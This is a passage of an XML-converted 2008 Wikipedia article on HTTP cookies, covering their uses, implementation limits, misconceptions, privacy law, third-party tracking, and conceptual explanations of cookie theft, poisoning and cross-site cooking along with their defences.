<?xml version="1.0" encoding="UTF-8"?>
<!-- generated by CLiX/Wiki2XML [MPI-Inf, MMCI@UdS] $LastChangedRevision: 92 $ on 16.04.2009 21:34:11[mciao0826] -->
<!DOCTYPE article SYSTEM "../article.dtd">
<article xmlns:xlink="http://www.w3.org/1999/xlink">
<text  confidence="0.8" wordnetid="106387980">
<know-how  confidence="0.8" wordnetid="105616786">
<line  confidence="0.8" wordnetid="107012534">
<method  confidence="0.8" wordnetid="105660268">
<heading  confidence="0.8" wordnetid="106343971">
<header>
<title>HTTP cookie</title>
<id>5068415</id>
<revision>
<id>244684411</id>
<timestamp>2008-10-12T01:11:54Z</timestamp>
<contributor>
<username>Mindmatrix</username>
<id>160367</id>
</contributor>
</revision>
<categories>
<category>Featured articles</category>
<category>Authentication methods</category>
<category>HTTP headers</category>
</categories>
</header>
<bdy>

<table style="width: 17em;" class="infobox">
<row style="background:#AADDBB" align="center">
<col style="font-size: 110%">
 <b><message wordnetid="106598915" confidence="0.8">
<information wordnetid="106634376" confidence="0.8">
<protocol wordnetid="106665108" confidence="0.8">
<standard wordnetid="107260623" confidence="0.8">
<direction wordnetid="106786629" confidence="0.8">
<rule wordnetid="106652242" confidence="0.8">
<format wordnetid="106636806" confidence="0.8">
<system_of_measurement wordnetid="113577171" confidence="0.8">
<link xlink:type="simple" xlink:href="../443/13443.xml">
HTTP</link></system_of_measurement>
</format>
</rule>
</direction>
</standard>
</protocol>
</information>
</message>
</b></col>
</row>
<row>
<col>
 <link xlink:type="simple" xlink:href="../808/7716808.xml">
Persistence</link> &middot; <link xlink:type="simple" xlink:href="../757/4954757.xml">
Compression</link> &middot; <link xlink:type="simple" xlink:href="../586/13586.xml">
SSL</link></col>
</row>
<row style="background:#CCFFCC" align="center">
<col>
 <link xlink:type="simple" xlink:href="../156/13106156.xml">
Headers</link></col>
</row>
<row>
<col>
 <text wordnetid="106387980" confidence="0.8">
<line wordnetid="107012534" confidence="0.8">
<heading wordnetid="106343971" confidence="0.8">
<link xlink:type="simple" xlink:href="../769/6376769.xml">
ETag</link></heading>
</line>
</text>
 &middot; <text wordnetid="106387980" confidence="0.8">
<know-how wordnetid="105616786" confidence="0.8">
<line wordnetid="107012534" confidence="0.8">
<method wordnetid="105660268" confidence="0.8">
<heading wordnetid="106343971" confidence="0.8">
<link xlink:type="simple" xlink:href="../415/5068415.xml">
Cookie</link></heading>
</method>
</line>
</know-how>
</text>
 &middot; <text wordnetid="106387980" confidence="0.8">
<line wordnetid="107012534" confidence="0.8">
<heading wordnetid="106343971" confidence="0.8">
<link xlink:type="simple" xlink:href="../885/5258885.xml">
Referer</link></heading>
</line>
</text>
</col>
</row>

<row style="background:#CCFFCC" align="center">
<col>
 <link xlink:type="simple" xlink:href="../108/1514108.xml">
Status codes</link></col>
</row>
<row>
<col>
 <written_communication wordnetid="106349220" confidence="0.8">
<code wordnetid="106667317" confidence="0.8">
<link xlink:type="simple" xlink:href="../986/11549986.xml">
200 OK</link></code>
</written_communication>
</col>
</row>
<row>
<col>
 <written_communication wordnetid="106349220" confidence="0.8">
<code wordnetid="106667317" confidence="0.8">
<link xlink:type="simple" xlink:href="../020/11550020.xml">
301 Moved permanently</link></code>
</written_communication>
</col>
</row>
<row>
<col>
 <written_communication wordnetid="106349220" confidence="0.8">
<code wordnetid="106667317" confidence="0.8">
<link xlink:type="simple" xlink:href="../022/11550022.xml">
302 Found</link></code>
</written_communication>
</col>
</row>
<row>
<col>
 <link xlink:type="simple" xlink:href="../028/11550028.xml">
303 See Other</link></col>
</row>
<row>
<col>
 <written_communication wordnetid="106349220" confidence="0.8">
<code wordnetid="106667317" confidence="0.8">
<link xlink:type="simple" xlink:href="../567/9519567.xml">
403 Forbidden</link></code>
</written_communication>
</col>
</row>
<row>
<col>
 <written_communication wordnetid="106349220" confidence="0.8">
<code wordnetid="106667317" confidence="0.8">
<link xlink:type="simple" xlink:href="../507/35507.xml">
404 Not Found</link></code>
</written_communication>
</col>
</row>
<row>
<col style="background:#CCFFCC" align="center"></col>
</row>
</table>

<b>HTTP cookies</b>, or more commonly referred to as <invention wordnetid="105633385" confidence="0.8">
<link xlink:type="simple" xlink:href="../139/33139.xml">
Web</link></invention>
 cookies, tracking cookies or just cookies, are parcels of text sent by a <link xlink:type="simple" xlink:href="../455/33455.xml">
server</link> to a Web <link xlink:type="simple" xlink:href="../970/667970.xml">
client</link> (usually a <link xlink:type="simple" xlink:href="../173/33173.xml">
browser</link>) and then sent back unchanged by the client each time it accesses that server.  <message wordnetid="106598915" confidence="0.8">
<information wordnetid="106634376" confidence="0.8">
<protocol wordnetid="106665108" confidence="0.8">
<standard wordnetid="107260623" confidence="0.8">
<direction wordnetid="106786629" confidence="0.8">
<rule wordnetid="106652242" confidence="0.8">
<format wordnetid="106636806" confidence="0.8">
<system_of_measurement wordnetid="113577171" confidence="0.8">
<link xlink:type="simple" xlink:href="../443/13443.xml">
HTTP</link></system_of_measurement>
</format>
</rule>
</direction>
</standard>
</protocol>
</information>
</message>
 cookies are used for <link xlink:type="simple" xlink:href="../967/47967.xml">
authenticating</link>, session tracking (state maintenance), and maintaining specific information about users, such as site preferences or the contents of their <link xlink:type="simple" xlink:href="../301/4431301.xml">
electronic shopping cart</link>s. The term "cookie" is derived from "<link xlink:type="simple" xlink:href="../333/425333.xml">
magic cookie</link>," a well-known concept in <link xlink:type="simple" xlink:href="../642/31642.xml">
UNIX</link> computing which inspired both the idea and the name of HTTP cookies.<p>

Because they can be used for tracking browsing behavior, cookies have been of concern for <link xlink:type="simple" xlink:href="../060/1228060.xml">
Internet privacy</link>. As a result, they have been subject to legislation in various countries such as the <body wordnetid="107965085" confidence="0.8">
<social_group wordnetid="107950920" confidence="0.8">
<political_orientation wordnetid="106212839" confidence="0.8">
<colony wordnetid="108374049" confidence="0.8">
<state wordnetid="108168978" confidence="0.8">
<political_unit wordnetid="108359949" confidence="0.8">
<group wordnetid="100031264" confidence="0.8">
<democracy wordnetid="106217103" confidence="0.8">
<link xlink:type="simple" xlink:href="../750/3434750.xml">
United States</link></democracy>
</group>
</political_unit>
</state>
</colony>
</political_orientation>
</social_group>
</body>
, as well as the <economy wordnetid="108366753" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../317/9317.xml">
European Union</link></economy>
. Cookies have also been criticized because the identification of users they provide is not always accurate and because they could potentially be a target of network attackers. Some alternatives to cookies exist, but each has its own uses, advantages, and drawbacks.</p>
<p>

Cookies are also subject to a number of misconceptions, mostly based on the erroneous notion that they are <link xlink:type="simple" xlink:href="../783/5783.xml">
computer program</link>s. In fact, cookies are simple pieces of data unable to perform any operation by themselves. In particular, they are neither <link xlink:type="simple" xlink:href="../951/28951.xml">
spyware</link> nor <link xlink:type="simple" xlink:href="../196/18994196.xml">
viruses</link>, although cookies from certain sites are described as spyware by many anti-spyware products because they allow users to be tracked when they visit various sites.</p>
<p>

Most modern browsers allow users to decide whether to accept cookies, but rejection makes some <link xlink:type="simple" xlink:href="../898/33898.xml">
website</link>s unusable. For example, shopping carts implemented using cookies do not work if cookies are rejected.</p>

<sec>
<st>
Use</st>
<p>

HTTP cookies are used by Web servers to differentiate users and to maintain data related to the user during navigation, possibly across multiple visits. HTTP cookies were introduced to provide a way to implement a "<link xlink:type="simple" xlink:href="../301/4431301.xml">
shopping cart</link>" (or "shopping basket"),<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%221%22])">1</ref><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%222%22])">2</ref> a virtual device into which the user can "place" items to purchase, so that users can navigate a site where items are shown, adding or removing items from the shopping basket at any time.</p>
<p>

Allowing users to log in to a website is another use of cookies. Users typically log in by inserting their credentials into a login page; cookies allow the server to know that the user is already authenticated, and therefore is allowed to access services or perform operations that are restricted to logged-in users.</p>
<p>

Many websites also use cookies for <link xlink:type="simple" xlink:href="../760/1656760.xml">
personalization</link> based on users' preferences. Sites that require authentication often use this feature, although it is also present on sites not requiring authentication. Personalization includes presentation and functionality. For example, the <web_site wordnetid="106359193" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../734/5043734.xml">
Wikipedia</link></web_site>
 website allows authenticated users to choose the webpage <link xlink:type="simple" xlink:href="../887/191887.xml">
skin</link> they like best; the <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../923/1092923.xml">
Google</link></company>
 search engine allows users (even non-registered ones) to decide how many search results per page they want to see.</p>
<p>

Cookies are also used to track users across a website. Third-party cookies and <link xlink:type="simple" xlink:href="../430/1157430.xml">
Web bug</link>s, explained below, also allow for tracking across multiple sites. Tracking within a site is typically done with the aim of producing usage statistics, while tracking across sites is typically used by advertising companies to produce anonymous user profiles, which are then used to target advertising (deciding which advertising image to show) based on the user profile.</p>

</sec>
<sec>
<st>
Implementation</st>
<p>

<image width="250px" src="HTTP_cookie_exchange.svg" type="thumb">
<caption>

A possible interaction between a Web browser and a server holding a Web page, in which the server sends a cookie to the browser and the browser sends it back when requesting another page.
</caption>
</image>

Technically, cookies are arbitrary pieces of data chosen by the <link xlink:type="simple" xlink:href="../455/33455.xml">
Web server</link> and sent to the browser. The browser returns them unchanged to the server, introducing a <link xlink:type="simple" xlink:href="../512/285512.xml">
state</link> (memory of previous events) into otherwise stateless HTTP transactions. Without cookies, each retrieval of a <link xlink:type="simple" xlink:href="../063/34063.xml">
Web page</link> or component of a Web page is an isolated event, mostly unrelated to all other views of the pages of the same site. By returning a cookie to a web server, the browser provides the server a means of connecting the current page view with prior page views. Other than being set by a web server, cookies can also be set by a <link xlink:type="simple" xlink:href="../524/29524.xml">
script</link> in a language such as <programming_language wordnetid="106898352" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../845/9845.xml">
JavaScript</link></programming_language>
, if supported and enabled by the Web browser.</p>
<p>

Cookie specifications<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%223%22])">3</ref><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%224%22])">4</ref> suggest that browsers should support a minimal number of cookies or amount of memory for storing them. In particular, an internet browser is expected to be able to store at least 300 cookies of four <link xlink:type="simple" xlink:href="../794/16794.xml">
kilobytes</link> each, and at least 20 cookies per server or <link xlink:type="simple" xlink:href="../878/39878.xml">
domain</link>. </p>
<p>

Relevant count of maximum stored cookies per domain for the major browsers are:</p>
<p>

<list>
<entry level="1" type="bullet">

 Firefox 1.5: 50</entry>
<entry level="1" type="bullet">

 Firefox 2.0: 50</entry>
<entry level="1" type="bullet">

 Opera 9: 30</entry>
<entry level="1" type="bullet">

 Internet Explorer 6: 20 (raised to 50 in update on August 14, 2007)</entry>
<entry level="1" type="bullet">

 Internet Explorer 7: 20 (raised to 50 in update on August 14, 2007)</entry>
</list>
</p>
<p>

In practice cookies must be smaller than 4 kilobytes.  Internet Explorer imposes a 4KB total for all cookies stored in a given domain.</p>
<p>

Cookie names are case insensitive according to section 3.1 of RFC 2965</p>
<p>

The cookie setter can specify a deletion date, in which case the cookie will be removed on that date. If the cookie setter does not specify a date, the cookie is removed once the user quits his or her browser. As a result, specifying a date is a way for making a cookie survive across sessions. For this reason, cookies with an expiration date are called <it>persistent</it>. As an example application, a shopping site can use persistent cookies to store the items users have placed in their basket. (In reality, the cookie may refer to an entry in a database stored at the shopping site, not on your computer.)  This way, if users quit their browser without making a purchase and return later, they still find the same items in the basket so they do not have to look for these items again. If these cookies were not given an expiration date, they would expire when the browser is closed, and the information about the basket content would be lost.</p>
<p>

Cookies can also be limited in scope to a specific domain, subdomain or path on the web server which created them.</p>

</sec>
<sec>
<st>
Misconceptions</st>
<p>

Since their introduction on the Internet, misconceptions about cookies have circulated on the Internet and in the media.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%225%22])">5</ref><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%226%22])">6</ref> In 1998, <link xlink:type="simple" xlink:href="../343/6161343.xml">
CIAC</link>, a computer incident response team of the <agency wordnetid="108337324" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../866/62866.xml">
United States Department of Energy</link></agency>
, found the security vulnerability "essentially nonexistent" and explained that "information about where you come from and what web pages you visit already exists in a web server's log files".<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%227%22])">7</ref> In 2005, <link xlink:type="simple" xlink:href="../406/1973406.xml">
Jupiter Research</link> published the results of a survey,<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%228%22])">8</ref> according to which a consistent percentage of respondents believed some of the following false claims:</p>
<p>

<list>
<entry level="1" type="bullet">

 Cookies are like <link xlink:type="simple" xlink:href="../010/6010.xml">
worms</link> and <link xlink:type="simple" xlink:href="../196/18994196.xml">
viruses</link> in that they can erase data from the user's hard disks</entry>
<entry level="1" type="bullet">

 Cookies generate <link xlink:type="simple" xlink:href="../320/466320.xml">
popup</link>s</entry>
<entry level="1" type="bullet">

 Cookies are used for <link xlink:type="simple" xlink:href="../368/28368.xml">
spamming</link></entry>
<entry level="1" type="bullet">

 Cookies are only used for <link xlink:type="simple" xlink:href="../861/2861.xml">
advertising</link></entry>
</list>
</p>
<p>

Cookies are in fact only data, not program code: they cannot erase or read information from the user's computer.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%229%22])">9</ref> However, cookies allow for detecting the Web pages viewed by a user on a given site or set of sites. This information can be collected in a <it>profile</it> of the user. Such profiles are often anonymous, that is, they do not contain personal information of the user (name, address, etc.) More precisely, they cannot contain personal information unless the user has made it available to some sites. Even if anonymous, these profiles  have been the subject of some privacy concerns.</p>
<p>

According to the same survey, a large percentage of Internet users do not know how to delete cookies.</p>

</sec>
<sec>
<st>
Browser settings</st>
<p>

Most modern browsers support cookies. However, a user can usually also choose whether cookies should be used or not. The following are common options:<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2210%22])">10</ref>
<list>
<entry level="1" type="number">

 To enable or disable cookies completely, so that they are always accepted or always blocked.</entry>
<entry level="1" type="number">

 To  allow the user to see the cookies that are active with respect to a given page by typing</entry>
</list>

javascript:alert("Cookies: "+document.cookie)
in the browser <link xlink:type="simple" xlink:href="../277/32277.xml">
URL</link> field. Some browsers incorporate a cookie manager for the user to see and selectively delete the cookies currently stored in the browser.</p>

</sec>
<sec>
<st>
Privacy and third-party cookies</st>
<p>

Cookies have some important implications on the <link xlink:type="simple" xlink:href="../009/25009.xml">
privacy</link> and <link xlink:type="simple" xlink:href="../382/181382.xml">
anonymity</link> of Web users. While cookies are only sent to the server setting them or one in the same <link xlink:type="simple" xlink:href="../878/39878.xml">
Internet domain</link>, a Web page may contain images or other components stored on servers in other domains. Cookies that are set during retrieval of these components are called <it>third-party cookies</it>.</p>
<p>

<image width="300px" src="Third_party_cookie.svg" type="thumb">
<caption>

In this fictional example, an advertising company has placed banners in two Web sites. Hosting the banner images on its servers and using third-party cookies, the advertising company is able to track the browsing of users across these two sites.
</caption>
</image>

Advertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or <link xlink:type="simple" xlink:href="../430/1157430.xml">
web bug</link>s. Knowledge of the pages visited by a user allows the advertisement company to target advertisement to the user's presumed preferences.</p>
<p>

The possibility of building a profile of users has been considered by some a potential privacy threat, even when the tracking is done on a single domain but especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.</p>
<p>

The <body wordnetid="107965085" confidence="0.8">
<social_group wordnetid="107950920" confidence="0.8">
<political_orientation wordnetid="106212839" confidence="0.8">
<colony wordnetid="108374049" confidence="0.8">
<state wordnetid="108168978" confidence="0.8">
<political_unit wordnetid="108359949" confidence="0.8">
<group wordnetid="100031264" confidence="0.8">
<democracy wordnetid="106217103" confidence="0.8">
<link xlink:type="simple" xlink:href="../750/3434750.xml">
United States</link></democracy>
</group>
</political_unit>
</state>
</colony>
</political_orientation>
</social_group>
</body>
 government has set strict rules on setting cookies in 2000 after it was disclosed that the White House <link xlink:type="simple" xlink:href="../089/595089.xml">
drug policy office</link> used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the <agency wordnetid="108337324" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../633/5183633.xml">
CIA</link></agency>
 had been leaving persistent cookies on computers for ten years. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2211%22])">11</ref> On December 25, 2005, Brandt discovered that the <agency wordnetid="108337324" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../939/21939.xml">
National Security Agency</link></agency>
 had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the National Security Agency immediately disabled the cookies.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2212%22])">12</ref></p>
<p>

The <weblink xlink:type="simple" xlink:href="http://europa.eu.int/smartapi/cgi/sga_doc?smartapi!celexapi!prod!CELEXnumdoc&amp;lg=en&amp;numdoc=32002L0058&amp;model=guichett">
2002 European Union telecommunication privacy Directive</weblink> contains rules about the use of cookies. In particular, Article 5, Paragraph 3 of this directive mandates that storing data (like cookies) in a user's computer can only be done if: 1) the user is provided information about how this data is used; and 2) the user is given the possibility of denying this storing operation. However, this article also states that storing data that is necessary for technical reasons is exempted from this rule. This directive was expected to have been applied since October 2003, but a <weblink xlink:type="simple" xlink:href="http://europa.eu.int/information_society/policy/ecomm/doc/implementation_enforcement/annualreports/10threport/sec20041535vol1en.pdf">
December 2004 report</weblink> says (page 38) that this provision was not applied in practice, and that some member countries (<country wordnetid="108544813" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../830/26830.xml">
Slovakia</link></country>
, <system wordnetid="108435388" confidence="0.8">
<economy wordnetid="108366753" confidence="0.8">
<group wordnetid="100031264" confidence="0.8">
<link xlink:type="simple" xlink:href="../514/17514.xml">
Latvia</link></group>
</economy>
</system>
, <country wordnetid="108544813" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../108/12108.xml">
Greece</link></country>
, <country wordnetid="108544813" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../343/3343.xml">
Belgium</link></country>
, and <country wordnetid="108544813" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../515/17515.xml">
Luxembourg</link></country>
) did not even implement the provision in national law. The same report suggests a thorough analysis of the situation in the Member States.</p>
<p>

The <standard wordnetid="107260623" confidence="0.8">
<system_of_measurement wordnetid="113577171" confidence="0.8">
<link xlink:type="simple" xlink:href="../446/1617446.xml">
P3P</link></system_of_measurement>
</standard>
 specification includes the possibility for a server to state a privacy policy, which specifies which kind of information it collects and for which purpose. These policies include (but are not limited to) the use of information gathered using cookies. According to the P3P specification, a browser can accept or reject cookies by comparing the privacy policy with the stored user preferences or ask the user, presenting them the privacy policy as declared by the server.</p>
<p>

Many web browsers including Apple's Safari and Microsoft Internet Explorer versions 6 and 7 support P3P which allows the web browser to determine whether to allow 3rd party cookies to be stored. The Opera web browser allows users to refuse third-party cookies and to create global and specific security profiles for Internet domains.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2213%22])">13</ref>  Firefox 2.x dropped this option from its menu system but it restored it with the release of version 3.x.</p>

<ss1>
<st>
Blocking third-party cookies</st>
<p>

Third-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies -- without causing any problems. <ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2214%22])">14</ref>  A secondary benefit is that it stops tracking by third-party companies' <link xlink:type="simple" xlink:href="../430/1157430.xml">
web bug</link>s that are on many web pages. Instructions on how to do this can be found <weblink xlink:type="simple" xlink:href="http://www.washingtonpost.com/wp-dyn/content/article/2005/07/16/AR2005071600111.html">
here</weblink>.</p>

</ss1>
</sec>
<sec>
<st>
Drawbacks of cookies</st>
<p>

Besides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are at odds with the Representational State Transfer
(<word wordnetid="106286395" confidence="0.8">
<part wordnetid="113809207" confidence="0.8">
<neologism wordnetid="106294441" confidence="0.8">
<language_unit wordnetid="106284225" confidence="0.8">
<link xlink:type="simple" xlink:href="../222/907222.xml">
REST</link></language_unit>
</neologism>
</part>
</word>
) software architectural style.</p>

<ss1>
<st>
Inaccurate identification</st>
<p>

If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a Web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.</p>
<p>

Likewise, cookies do not differentiate between multiple users who share a computer and browser, if they do not use different <link xlink:type="simple" xlink:href="../990/16301990.xml">
user account</link>s.</p>

</ss1>
<ss1>
<st>
Cookie hijacking</st>
<p>

<image width="200px" src="Cookie-sniffing.svg" type="thumb">
<caption>

A cookie can be stolen by another computer that is allowed reading from the network
</caption>
</image>

During normal operation cookies are sent back and forth between a server (or a group of servers in the same domain) and the computer of the browsing user. Since cookies may contain sensitive information (user name, a token used for <link xlink:type="simple" xlink:href="../967/47967.xml">
authentication</link>, etc.), their values should not be accessible to other computers. Cookie theft is the act of intercepting cookies by an unauthorized party.</p>
<p>

Cookies can be stolen via <link xlink:type="simple" xlink:href="../114/59114.xml">
packet sniffing</link> in an attack called <link xlink:type="simple" xlink:href="../726/4456726.xml">
session hijacking</link>. Traffic on a network can be intercepted and read by computers on the network other than its sender and its receiver (particularly on <link xlink:type="simple" xlink:href="../935/157935.xml">
unencrypted</link> public <link xlink:type="simple" xlink:href="../973/63973.xml">
Wi-Fi</link> networks). This traffic includes cookies sent on ordinary unencrypted <link xlink:type="simple" xlink:href="../443/13443.xml">
http</link> sessions. Where network traffic is not encrypted, malicious users can therefore read the communications of other users on the network, including their cookies, using programs called <link xlink:type="simple" xlink:href="../114/59114.xml">
packet sniffer</link>s. </p>
<p>

This issue can be overcome by securing the communication between the user's computer and the server by employing <message wordnetid="106598915" confidence="0.8">
<protocol wordnetid="106665108" confidence="0.8">
<standard wordnetid="107260623" confidence="0.8">
<direction wordnetid="106786629" confidence="0.8">
<rule wordnetid="106652242" confidence="0.8">
<system_of_measurement wordnetid="113577171" confidence="0.8">
<link xlink:type="simple" xlink:href="../813/187813.xml">
Transport Layer Security</link></system_of_measurement>
</rule>
</direction>
</standard>
</protocol>
</message>
 (<link xlink:type="simple" xlink:href="../586/13586.xml">
https</link> protocol) to encrypt the connection. A server can specify the <it>secure flag</it> while setting a cookie; the browser will then send it only over a secure channel, such as an <link xlink:type="simple" xlink:href="../813/187813.xml">
SSL</link> connection.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2215%22])">15</ref> </p>
<p>

However a large number of websites, although using secure <link xlink:type="simple" xlink:href="../586/13586.xml">
https</link> communication for user <link xlink:type="simple" xlink:href="../967/47967.xml">
authentication</link> (i.e. the <know-how wordnetid="105616786" confidence="0.8">
<method wordnetid="105660268" confidence="0.8">
<link xlink:type="simple" xlink:href="../372/9878372.xml">
login</link></method>
</know-how>
 page), subsequently send session cookies and other data over ordinary <link xlink:type="simple" xlink:href="../935/157935.xml">
unencrypted</link> <link xlink:type="simple" xlink:href="../443/13443.xml">
http</link> connections for performance reasons.  Attackers can therefore easily intercept the cookies of other users and impersonate them on the relevant websites<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2216%22])">16</ref> or use them in a <link xlink:type="simple" xlink:href="../934/19422934.xml">
cookiemonster attack</link>. </p>
<p>

<image width="200px" src="Cookie-theft.svg" type="thumb">
<caption>

Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.
</caption>
</image>
 A different way to steal cookies is <link xlink:type="simple" xlink:href="../154/241154.xml">
cross-site scripting</link> and making the browser itself send cookies to servers that should not receive them. Modern browsers allow execution of pieces of code retrieved from the server. If cookies are accessible during execution, their value may be communicated in some form to servers that should not access them. Encrypting cookies before sending them on the network does not help against this attack.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2217%22])">17</ref></p>
<p>

This type of cross-site scripting is typically exploited by attackers on sites that allow users to post <format wordnetid="106636806" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../191/13191.xml">
HTML</link></format>
 content. By embedding a suitable piece of code in an HTML post, an attacker may receive cookies of other users. Knowledge of these cookies can then be exploited by connecting to the same site using the stolen cookies, thus being recognised as the user whose cookies have been stolen.</p>
<p>

A way for preventing such attacks is by the HttpOnly flag;<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2218%22])">18</ref> this is an option, first introduced by Microsoft<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2219%22])">19</ref> and implemented in PHP since version 5.20 <ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2220%22])">20</ref> that is intended to make a cookie inaccessible to client side script. However, <link xlink:type="simple" xlink:href="../187/460187.xml">
web developers</link> should consider developing their websites so that they are immune to cross-site scripting.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2221%22])">21</ref></p>
<p>

<image width="200px" src="Cookie-poison.svg" type="thumb">
<caption>

Cookie poisoning: an attacker sends a server an invalid cookie, possibly modifying a valid cookie it previously received from the server.
</caption>
</image>
</p>

</ss1>
<ss1>
<st>
Cookie poisoning</st>
<p>

While cookies are supposed to be stored and sent back to the server unchanged, an attacker may modify the value of cookies before sending them back to the server. If, for example, a cookie contains the total value a user has to pay for the items in their shopping basket, changing this value exposes the server to the risk of making the attacker pay less than the supposed price. The process of tampering with the value of cookies is called <it>cookie poisoning</it>, and is sometimes used after cookie theft to make an attack persistent.
<image width="200px" src="Cookie-cooking.svg" type="thumb">
<caption>

In cross-site cooking, the attacker exploits a browser bug to send an invalid cookie to a server.
</caption>
</image>
</p>
<p>

Most websites, however, only store a session identifier &mdash; a randomly generated unique number used to identify the user's session &mdash; in the cookie itself, while all the other information is stored on the server. In this case, the problem of cookie poisoning is largely eliminated.</p>

</ss1>
<ss1>
<st>
Cross-site cooking</st>
<p>

Each site is supposed to have its own cookies, so a site like <link xlink:type="simple" xlink:href="../806/1191806.xml">
example.com</link> should not be able to alter or set cookies for another site, like <link xlink:type="simple" xlink:href="../806/1191806.xml">
example.org</link>. <accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../767/4031767.xml">
Cross-site cooking</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
 vulnerabilities in web browsers allow malicious sites to break this rule. This is similar to cookie poisoning, but the attacker exploits non-malicious users with vulnerable browsers, instead of attacking the actual site directly. The goal of such attacks may be to perform <link xlink:type="simple" xlink:href="../708/3764708.xml">
session fixation</link>.</p>
<p>

Users are advised to use the more recent versions of web browsers in which such issue is mitigated.</p>

</ss1>
<ss1>
<st>
Inconsistent state on client and server</st>
<p>

The use of cookies may generate an inconsistency between the state of the client and the state as stored in the cookie. If the user acquires a cookie and then clicks the "Back" button of the browser, the state on the browser is generally not the same as before that acquisition. As an example, if the shopping cart of an online shop is realized using cookies, the content of the cart may not change when the user goes back in the browser's history: if the user presses a button to add an item in the shopping cart and then clicks on the "Back" button, the item remains in the shopping cart. This might not be the intention of the user, who possibly wanted to undo the addition of the item. This can lead to unreliability, confusion, and bugs. Web developers should therefore be aware of this issue and implement measures to handle such situations as this.</p>

</ss1>
<ss1>
<st>
Cookie expiration</st>
<p>

Persistent cookies have been criticized by privacy experts for not being set to expire soon enough, and thereby allowing some websites to track users and build up a profile of them over time.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2222%22])">22</ref>  This aspect of cookies also compounds the issue of <link xlink:type="simple" xlink:href="../726/4456726.xml">
session hijacking</link>, because a stolen persistent cookie can potentially be used to impersonate a user for a considerable period of time.</p>

</ss1>
</sec>
<sec>
<st>
Alternatives to cookies</st>
<p>

Some of the operations that can be realised using cookies can also be realised using other mechanisms. However, these alternatives to cookies have their own drawbacks, which make cookies usually preferred to them in practice. Most of the following alternatives allow for user tracking, even if not as reliably as cookies. As a result, privacy is an issue even if cookies are rejected by the browser or not set by the server.</p>

<ss1>
<st>
IP address</st>
<p>

An unreliable technique for tracking users is based on storing the <link xlink:type="simple" xlink:href="../921/14921.xml">
IP address</link>es of the computers requesting the pages. This technique has been available since the introduction of the World Wide Web, as downloading pages requires the server holding them to know the IP address of the computer running the browser or the <link xlink:type="simple" xlink:href="../768/78768.xml">
proxy</link>, if any is used. This information is available for the server to be stored regardless of whether cookies are used or not.</p>
<p>

However, these addresses are typically less reliable in identifying a user than cookies because computers and proxies may be shared by several users, and the same computer may be assigned different Internet addresses in different work sessions (this is often the case for <link xlink:type="simple" xlink:href="../546/59546.xml">
dial-up</link> connections). The reliability of this technique can be improved by using another feature of the HTTP protocol: when a browser requests a page because the user has followed a link, the request that is sent to the server contains the URL of the page where the link is located. If the server stores these URLs, the path of page viewed by the user can be tracked more precisely. However, these traces are less reliable than the ones provided by cookies, as several users may access the same page from the same computer, <link xlink:type="simple" xlink:href="../036/53036.xml">
NAT router</link>, or proxy and then follow two different links. Moreover, this technique only allows tracking and cannot replace cookies in their other uses.</p>
<p>

Tracking by IP address can be impossible with some systems that are used to retain <link>
Internet anonymity</link>, such as <software wordnetid="106566077" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../150/18582150.xml">
Tor</link></software>
. With such systems, not only could one browser carry multiple addresses throughout a session, but multiple users could appear to be coming from the same IP address, thus making IP address use for tracking wholly unreliable.</p>
<p>

